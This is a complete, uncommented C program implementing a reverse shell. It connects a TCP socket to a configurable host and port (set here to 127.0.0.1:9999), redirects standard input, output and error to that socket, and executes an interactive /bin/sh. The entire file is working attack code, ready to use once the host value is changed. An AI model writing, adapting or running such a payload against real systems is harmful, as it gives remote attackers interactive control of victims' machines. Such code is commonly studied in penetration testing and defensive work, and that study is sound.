#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define HOST "127.0.0.1"
#define PORT 9999

#define PROC "/bin/sh"

#define ARGV { PROC, "-i" }

void main(void)
{
    struct sockaddr_in addr;

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = inet_addr(HOST);
    addr.sin_port        = htons(PORT);

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    execve(PROC, (char * const [])ARGV, NULL);
}